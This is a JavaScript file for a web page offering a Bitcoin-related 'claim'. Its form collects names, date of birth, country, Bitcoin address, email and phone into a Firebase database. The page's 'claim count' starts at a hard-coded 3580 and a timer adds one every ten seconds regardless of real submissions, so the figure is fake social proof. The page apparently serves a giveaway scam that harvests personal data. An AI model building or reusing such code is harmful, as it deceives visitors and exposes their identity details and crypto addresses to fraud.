document.addEventListener('DOMContentLoaded', function () {
  const openFormButton = document.getElementById('open-form');
  const closeFormButton = document.getElementById('close-form');
  const closeFormBottomButton = document.getElementById('close-form-bottom');
  const modal = document.getElementById('claim-modal');
  const form = document.getElementById('claim-form');
  const messageBox = document.getElementById('form-message');
  const spinner = document.getElementById('submit-spinner');
  const countElement = document.getElementById('claim-count');
  const processedCount = document.getElementById('processed-count');

  function openModal() {
    modal.classList.add('open');
    modal.setAttribute('aria-hidden', 'false');
  }

  function closeModal() {
    modal.classList.remove('open');
    modal.setAttribute('aria-hidden', 'true');
  }

  function updateCountText(value) {
    countElement.textContent = value.toLocaleString();
    processedCount.textContent = value.toLocaleString();
    countElement.classList.add('updated');
    setTimeout(() => countElement.classList.remove('updated'), 400);
  }

  function listenClaimCount() {
    const countRef = rtdb.ref('claim_count');
    countRef.on('value', (snapshot) => {
      const count = snapshot.exists() ? snapshot.val() : 3580;
      updateCountText(count);
    });
  }

  async function ensureClaimCount() {
    try {
      const snapshot = await rtdb.ref('claim_count').once('value');
      if (!snapshot.exists()) {
        await rtdb.ref('claim_count').set(3580);
      }
    } catch (error) {
      console.error('Failed to initialize claim count:', error);
    }
  }

  function validatePhone(phone) {
    return /^\+[1-9][0-9]{6,14}$/.test(phone);
  }

  function clearMessage() {
    if (!messageBox) return;
    messageBox.textContent = '';
    messageBox.className = '';
  }

  function showMessage(message, isSuccess = false) {
    if (!messageBox) return;
    messageBox.textContent = message;
    messageBox.className = isSuccess ? 'success-message' : 'error-message';
  }

  openFormButton?.addEventListener('click', openModal);
  closeFormButton?.addEventListener('click', closeModal);
  closeFormBottomButton?.addEventListener('click', closeModal);

  form?.addEventListener('submit', async function (event) {
    event.preventDefault();
    clearMessage(messageBox);

    const firstName = document.getElementById('firstName').value.trim();
    const lastName = document.getElementById('lastName').value.trim();
    const dob = document.getElementById('dob').value;
    const country = document.getElementById('country').value;
    const bitcoinAddress = document.getElementById('bitcoinAddress').value.trim();
    const email = document.getElementById('email').value.trim();
    const phone = document.getElementById('phone').value.trim();

    if (firstName.length < 2) return showMessage('Please enter a valid first name.');
    if (lastName.length < 2) return showMessage('Please enter a valid last name.');
    if (!dob) return showMessage('Please enter your date of birth.');
    if (!country) return showMessage('Please select your country.');
    if (bitcoinAddress.length < 8) return showMessage('Please enter a valid Bitcoin address.');
    if (!email || !email.includes('@')) return showMessage('Please enter a valid email address.');
    if (!validatePhone(phone)) return showMessage('Please enter a valid phone number with country code, for example +1234567890.');

    const dobDate = new Date(dob);
    const age = new Date().getFullYear() - dobDate.getFullYear();
    if (age < 18) return showMessage('You must be 18 or older to claim this offer.');

    spinner.classList.add('spinner-active');

    try {
      await db.collection('claims').add({
        firstName,
        lastName,
        dob,
        country,
        bitcoinAddress,
        email,
        phone,
        createdAt: firebase.firestore.FieldValue.serverTimestamp()
      });

      // Increment the public claim count in Realtime Database
      await rtdb.ref('claim_count').transaction((current) => {
        return (current || 3580) + 1;
      });

      showMessage('Your claim has been received. Our team will review your submission and reach out soon.', true);
      form.reset();
      setTimeout(() => {
        closeModal();
        clearMessage();
      }, 2000);

    } catch (error) {
      console.error('Submission failed', error);
      showMessage('We could not process your request at this time. Please try again later.');
    } finally {
      spinner.classList.remove('spinner-active');
    }
  });

  function startAutoIncrement() {
    const countRef = rtdb.ref('claim_count');
    setInterval(async () => {
      try {
        await countRef.transaction((current) => {
          return (current || 3580) + 1;
        });
      } catch (error) {
        console.error('Auto-increment failed:', error);
      }
    }, 10000);
  }

  // Initialize claim count, listen for realtime updates, and start automatic increments
  (async () => {
    await ensureClaimCount();
    listenClaimCount();
    startAutoIncrement();
  })();
});
